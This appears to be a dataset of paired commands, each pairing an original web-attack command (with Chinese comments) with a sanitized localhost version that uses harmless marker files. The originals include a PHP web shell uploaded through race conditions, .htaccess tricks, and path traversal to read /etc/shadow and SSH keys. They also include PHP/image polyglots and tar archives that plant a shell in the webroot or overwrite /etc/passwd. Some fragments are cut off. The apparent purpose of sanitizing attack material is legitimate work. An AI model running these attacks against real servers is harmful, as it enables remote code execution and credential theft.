patches.expectedCommand:
# 分析上传流程:
# 1. 文件上传到临时目录
# 2. 后端进行安全检查(文件类型/内容)
# 3. 如果检查通过则保留，否则删除
# 在步骤1和步骤3之间存在时间窗口

# 测试上传响应时间(判断是否有检查延迟)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done
patches.command:
BASE="http://127.0.0.1:8080"
MARKER_FILE="./payloader-fixture/PAYLOADER_MARKER.txt"
test -f "$MARKER_FILE" || { printf "%s\n" "missing marker fixture" >&2; exit 1; }
for i in 1 2 3; do
  curl --silent --show-error --max-time 3 --output /dev/null \
    --write-out "attempt=${i} status=%{http_code} total=%{time_total}\n" \
    -F "file=@${MARKER_FILE};type=text/plain;filename=PAYLOADER_MARKER.txt" \
    "${BASE}/upload"
done

patches.expectedCommand:
# 恶意PHP文件 (shell.php):
# <?php system($_GET["cmd"]); ?>

# 方法1: 使用两个终端并发操作
# 终端1 - 持续上传:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# 终端2 - 持续访问:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done
patches.command:
BASE="http://127.0.0.1:8080"
MARKER_FILE="./payloader-fixture/PAYLOADER_MARKER.txt"
for i in 1 2 3 4; do
  token="PAYLOADER_MARKER_${i}"
  curl --silent --show-error --max-time 3 -F "file=@${MARKER_FILE};type=text/plain;filename=${token}.txt" "${BASE}/upload" >/dev/null &
  upload_pid=$!
  body=$(curl --silent --show-error --max-time 2 "${BASE}/uploads/${token}.txt" || true)
  wait "$upload_pid" || true
  [ "$body" = "PAYLOADER_MARKER" ] && printf "marker_visible token=%s\n" "$token"
  sleep 0.1
done

import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"
ATTEMPTS = 4

def attempt(index, marker_path):
    token = f"PAYLOADER_MARKER_{index}"
    with marker_path.open("rb") as handle:
        upload = requests.post(f"{BASE}/upload", files={"file": (f"{token}.txt", handle, "text/plain")}, timeout=3)
    read = requests.get(f"{BASE}/uploads/{token}.txt", timeout=2)
    return index, upload.status_code, read.status_code, read.text == "PAYLOADER_MARKER"

with tempfile.TemporaryDirectory(prefix="payloader-race-") as directory:
    marker = Path(directory) / "PAYLOADER_MARKER.txt"
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    with ThreadPoolExecutor(max_workers=2) as pool:
        results = list(pool.map(lambda i: attempt(i, marker), range(ATTEMPTS)))
    for result in results:
        print(result)
    assert len(results) == ATTEMPTS

# 2. 在.htaccess存在的时间窗口内访问.jpg

  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done
patches.command:
BASE="http://127.0.0.1:8080"
WORK="./payloader-fixture/race-policy"
mkdir -p "$WORK"
trap 'rm -rf "$WORK"' EXIT
printf "%s\n" "AddType text/plain .marker" > "$WORK/.htaccess"
printf "%s" "PAYLOADER_MARKER" > "$WORK/sample.marker"
for i in 1 2 3; do
  curl --silent --show-error --max-time 3 -F "file=@$WORK/sample.marker;type=text/plain;filename=sample.marker" "$BASE/upload" >/dev/null
  curl --silent --show-error --max-time 3 -F "file=@$WORK/.htaccess;type=text/plain;filename=.htaccess" "$BASE/upload" >/dev/null &
  policy_pid=$!
  value=$(curl --silent --show-error --max-time 2 "$BASE/uploads/sample.marker" || true)
  wait "$policy_pid" || true
  [ "$value" = "PAYLOADER_MARKER" ] && printf "text_marker_visible attempt=%s\n" "$i"
done

import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"
ATTEMPTS = 8

def one(index, marker):
    token = f"PAYLOADER_MARKER_{index}"
    with marker.open("rb") as handle:
        upload = requests.post(f"{BASE}/upload", files={"file": (f"{token}.txt", handle, "text/plain")}, timeout=3)
    read = requests.get(f"{BASE}/uploads/{token}.txt", timeout=2)
    return upload.status_code, read.status_code, read.text == "PAYLOADER_MARKER"

with tempfile.TemporaryDirectory(prefix="payloader-marker-") as directory:
    marker = Path(directory) / "PAYLOADER_MARKER.txt"
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    with ThreadPoolExecutor(max_workers=2) as pool:
        for result in pool.map(lambda i: one(i, marker), range(ATTEMPTS)):
            print(result)

import tempfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"

def upload(path, name):
    with path.open("rb") as handle:
        return requests.post(f"{BASE}/upload", files={"file": (name, handle, "text/plain")}, timeout=3).status_code

with tempfile.TemporaryDirectory(prefix="payloader-htaccess-") as directory:
    root = Path(directory)
    policy = root / ".htaccess"
    marker = root / "PAYLOADER_MARKER.marker"
    policy.write_text("AddType text/plain .marker\n", encoding="utf-8")
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    for _ in range(4):
        with ThreadPoolExecutor(max_workers=2) as pool:
            print(list(pool.map(lambda args: upload(*args), [(policy, ".htaccess"), (marker, marker.name)])))

patches.expectedCommand:
# 利用分块传输延长上传时间窗口
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: multipart/form-data; boundary=abc\r\n\r\n"
)
sock.send(headers.encode())

# 缓慢发送分块数据，延长文件存在时间
chunks = ["5\r\nhello\r\n", "5\r\nworld\r\n", "0\r\n\r\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)
patches.command:
import socket

host, port = "127.0.0.1", 8080
boundary = "PAYLOADER_BOUNDARY"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="file"; filename="PAYLOADER_MARKER.txt"\r\n'
    "Content-Type: text/plain\r\n\r\n"
    f"PAYLOADER_MARKER\r\n--{boundary}--\r\n"
).encode("ascii")
headers = (
    "POST /upload HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Transfer-Encoding: chunked\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    "Connection: close\r\n\r\n"
).encode("ascii")
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(headers)
    for offset in range(0, len(body), 16):
        chunk = body[offset:offset + 16]
        sock.sendall(f"{len(chunk):X}\r\n".encode("ascii") + chunk + b"\r\n")
    sock.sendall(b"0\r\n\r\n")
    print(sock.recv(4096).decode("latin-1", errors="replace"))

patches.expectedCommand:
#!/bin/bash
# 批量测试常见敏感文件路径
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${BASE}${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "${BASE}${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done
patches.command:
BASE="http://127.0.0.1:8080/download?file="
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
FILES=("../outside/PAYLOADER_MARKER.txt" "../outside/PAYLOADER_MARKER.json" "../outside/PAYLOADER_MARKER.xml")
for file in "${FILES[@]}"; do
  output="$WORK/$(basename "$file")"
  if curl --fail --silent --show-error --max-time 3 "${BASE}${file}" -o "$output"; then
    grep --fixed-strings --quiet "PAYLOADER_MARKER" "$output" && printf "marker_read path=%s\n" "$file"
  fi
done

patches.expectedCommand:
# 测试不同的上传方式判断检查点:

# 1. 正常上传(应该成功):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. 修改Content-Type(判断是否仅检查MIME):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. 修改扩展名(判断是否检查扩展名):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. 仅修改文件头(判断是否检查Magic Bytes):
# GIF89a开头的PHP:
printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"
patches.command:
BASE="http://127.0.0.1:8080"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
printf "%s" "PAYLOADER_MARKER" > "$WORK/marker.txt"
cp "$WORK/marker.txt" "$WORK/marker.jpg"
curl --fail --silent --show-error --max-time 3 -F "file=@$WORK/marker.jpg;type=image/jpeg" "$BASE/upload"
curl --fail --silent --show-error --max-time 3 -F "file=@$WORK/marker.txt;type=image/jpeg;filename=PAYLOADER_MARKER.txt" "$BASE/upload"
curl --fail --silent --show-error --max-time 3 -F "file=@$WORK/marker.jpg;type=text/plain;filename=PAYLOADER_MARKER.jpg" "$BASE/upload"
printf "GIF89aPAYLOADER_MARKER" > "$WORK/marker.gif"
curl --fail --silent --show-error --max-time 3 -F "file=@$WORK/marker.gif;type=image/gif;filename=PAYLOADER_MARKER.gif" "$BASE/upload"

patches.command:
import tempfile
from pathlib import Path

fixtures = {
    "marker.jpg": bytes.fromhex("FFD8FFE000104A464946") + b"PAYLOADER_MARKER",
    "marker.png": bytes.fromhex("89504E470D0A1A0A") + b"PAYLOADER_MARKER",
    "marker.gif": b"GIF89aPAYLOADER_MARKER",
    "marker.bmp": b"BM" + (54).to_bytes(4, "little") + b"\x00" * 48 + b"PAYLOADER_MARKER",
}
with tempfile.TemporaryDirectory(prefix="payloader-signature-") as directory:
    root = Path(directory)
    for name, data in fixtures.items():
        path = root / name
        path.write_bytes(data)
        assert path.read_bytes().endswith(b"PAYLOADER_MARKER")
        print(name, len(data), data[:12].hex())

patches.expectedCommand:
# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot（使用exiftool注入）
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\x00'*46+b'<?php echo \"security_check\"; ?>')"
patches.command:
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
python3 - "$WORK" <<'PY'
import base64, pathlib, sys
root = pathlib.Path(sys.argv[1])
root.joinpath("marker.png").write_bytes(base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="))
PY
exiftool -overwrite_original -Comment="PAYLOADER_MARKER" "$WORK/marker.png"
cp "$WORK/marker.png" "$WORK/PAYLOADER_MARKER.png"
python3 -c "from pathlib import Path; p=Path('$WORK/marker.bmp'); p.write_bytes(b'BM'+(54).to_bytes(4,'little')+b'\x00'*48+b'PAYLOADER_MARKER')"
exiftool -Comment "$WORK/marker.png"

patches.command:
import socket

host, port = "127.0.0.1", 8080
boundary = "PAYLOADER_BOUNDARY"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="file"; filename="PAYLOADER_MARKER.txt"\r\n'
    "Content-Type: text/plain\r\n\r\n"
    f"PAYLOADER_MARKER\r\n--{boundary}--\r\n"
).encode("ascii")
request = (
    "POST /upload HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n\r\n"
).encode("ascii") + body
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(request)
    print(sock.recv(4096).decode("latin-1", errors="replace"))

patches.command:
import tempfile
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"
names = [
    "PAYLOADER_MARKER.txt.",
    "PAYLOADER_MARKER.txt ",
    "PAYLOADER_MARKER.txt::$DATA",
    "PAYLOADER_MARKER.TXT",
    "PAYLOADER_MARKER.txt" + "/./" * 64,
]
with tempfile.TemporaryDirectory(prefix="payloader-name-") as directory:
    marker = Path(directory) / "PAYLOADER_MARKER.txt"
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    for name in names:
        with marker.open("rb") as handle:
            response = requests.post(f"{BASE}/upload", files={"file": (name, handle, "text/plain")}, timeout=3)
        print(repr(name), response.status_code)

../outside/PAYLOADER_MARKER.txt/./././././././././././././././.

PAYLOADER_MARKER.txt.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

PAYLOADER_MARKER.txt................................

# 基础遍历:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# 测试遍历深度(通常3-10层足够到根目录):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=${traversal}etc/passwd")
  echo "Depth $i: $resp"
done
patches.command:
BASE="http://127.0.0.1:8080/file?path="
for depth in 1 2 3 4; do
  traversal=$(printf "../%.0s" $(seq 1 "$depth"))
  value=$(curl --fail --silent --show-error --max-time 3 "${BASE}${traversal}outside/PAYLOADER_MARKER.txt" || true)
  [ "$value" = "PAYLOADER_MARKER" ] && printf "marker_read depth=%s\n" "$depth"
done

# 构造恶意TAR包:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # 添加恶意文件
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# 使用符号链接攻击:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # 创建指向/etc/passwd的符号链接
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # 然后通过"link_to_passwd"覆盖目标文件
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))

import io
import tarfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
content = b"PAYLOADER_MARKER"
with tarfile.open(root / "path-traversal.tar.gz", "w:gz") as archive:
    member = tarfile.TarInfo("../outside/PAYLOADER_MARKER.txt")
    member.size = len(content)
    archive.addfile(member, io.BytesIO(content))
with tarfile.open(root / "symlink.tar.gz", "w:gz") as archive:
    link = tarfile.TarInfo("marker-link")
    link.type = tarfile.SYMTYPE
    link.linkname = "../outside/PAYLOADER_MARKER.txt"
    archive.addfile(link)
for path in root.glob("*.tar.gz"):
    with tarfile.open(path, "r:gz") as archive:
        print(path.name, [(m.name, m.linkname) for m in archive.getmembers()])

# 创建包含符号链接的压缩包
import zipfile, os

# 方法1: tar符号链接
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# 方法2: zip中嵌入符号链接（Linux）
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')
patches.command:
import stat
import tarfile
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
target = "../outside/PAYLOADER_MARKER.txt"
with tarfile.open(root / "symlink.tar.gz", "w:gz") as archive:
    info = tarfile.TarInfo("marker-link")
    info.type = tarfile.SYMTYPE
    info.linkname = target
    archive.addfile(info)
with zipfile.ZipFile(root / "symlink.zip", "w") as archive:
    info = zipfile.ZipInfo("marker-link")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    archive.writestr(info, target)
print(target)

patches.command:
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
archive_path = root / "encoded.zip"
with zipfile.ZipFile(archive_path, "w") as archive:
    archive.writestr(r"..\outside\PAYLOADER_MARKER.txt", "PAYLOADER_MARKER")
with zipfile.ZipFile(archive_path, "r") as archive:
    for info in archive.infolist():
        print(repr(info.filename), info.flag_bits, info.file_size)
raw = archive_path.read_bytes()
print("archive_bytes", len(raw), "contains_marker", b"PAYLOADER_MARKER" in raw)
